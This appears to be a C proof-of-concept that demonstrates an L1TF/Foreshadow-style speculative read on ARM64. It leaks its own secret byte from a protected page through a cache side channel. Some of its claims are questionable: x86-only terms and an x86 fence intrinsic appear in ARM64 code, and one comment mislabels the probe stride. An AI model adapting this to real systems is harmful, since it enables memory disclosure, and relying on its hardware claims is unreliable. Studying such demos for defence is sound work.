#include "utils_arm64.c"

// --- L1 Terminal Fault (L1TF / Foreshadow) ---
// ARM64-compatible version

uint8_t secret_l1tf_byte = 'L';
volatile uint8_t *g_l1tf_secret_page = NULL; // Will point to an unmapped page

static sigjmp_buf jmpbuf_l1tf;

void sigsegv_handler_l1tf(int sig)
{
    // Reset signal handler to default to prevent infinite loops
    signal(SIGSEGV, SIG_DFL);
    siglongjmp(jmpbuf_l1tf, 1);
}

int main()
{
    common_init();
    printf("\n--- Running L1 Terminal Fault (L1TF) Demo (ARM64-compatible) ---\n");

    // Allocate a page that we can write to initially, then make it unmapped
    // This simulates the L1TF condition where data exists in cache but page is unmapped
    size_t page_size = getpagesize();
    g_l1tf_secret_page = (uint8_t *)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_l1tf_secret_page == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    // Place a "secret" at an offset within this page
    *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;

    // Set up signal handler to catch segmentation faults FIRST
    if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR)
    {
        perror("signal");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }

    // Now make the page unmapped to simulate L1TF condition
    if (mprotect((void *)g_l1tf_secret_page, page_size, PROT_NONE) == -1)
    {
        perror("mprotect");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }

    // Verify the page is now unmapped by trying to access it (should segfault)
    printf("Page is now unmapped. Testing signal handler...\n");
    if (sigsetjmp(jmpbuf_l1tf, 1) == 0)
    {
        volatile uint8_t test = *(g_l1tf_secret_page + 0x100); // This should segfault
        (void)test;                                            // Suppress unused variable warning
        printf("ERROR: Page is still accessible!\n");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }
    else
    {
        printf("Signal handler working correctly. Starting L1TF attack...\n");
    }

    printf("Attempting L1TF-style transient read from unmapped page...\n");
    printf("Secret byte: %c (0x%02x)\n", secret_l1tf_byte, secret_l1tf_byte);

    for (int attempt = 0; attempt < 500; ++attempt)
    {
        flush_probe_array();

        if (sigsetjmp(jmpbuf_l1tf, 1) == 0)
        {
            // The core of L1TF: speculative load from a "not present" but L1-cached address.
            // This is the ARM64 equivalent of the x86 Meltdown-style attack.
            // The address must be in a general-purpose register.
            __asm__ __volatile__(
                "1:\n\t"
                "ldr x0, [%0]\n\t"     // Speculatively load from g_l1tf_secret_page+0x100 into x0
                                       // This triggers the L1TF condition (PTE.P=0)
                "lsl x0, x0, #12\n\t"  // Shift x0 (leaked byte) by cache line size
                "ldr x1, [%1, x0]\n\t" // Access probe_array[leaked_byte * CACHE_LINE_SIZE]
                "2:\n\t"
                :
                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)
                : "x0", "x1", "memory");
        }
        else
        {
            // Signal was caught, ensure speculative effects are visible
            _mm_lfence(); // Fence to ensure speculative writes to cache are visible
        }

        // --- Measurement Phase ---
        if (perform_measurement(secret_l1tf_byte, "L1TF secret"))
        {
            munmap((void *)g_l1tf_secret_page, page_size);
            return 0;
        }
    }

    printf("Failed to leak the L1TF secret byte.\n");
    printf("Actual secret data: %c\n", secret_l1tf_byte);
    munmap((void *)g_l1tf_secret_page, page_size);
    return 0;
}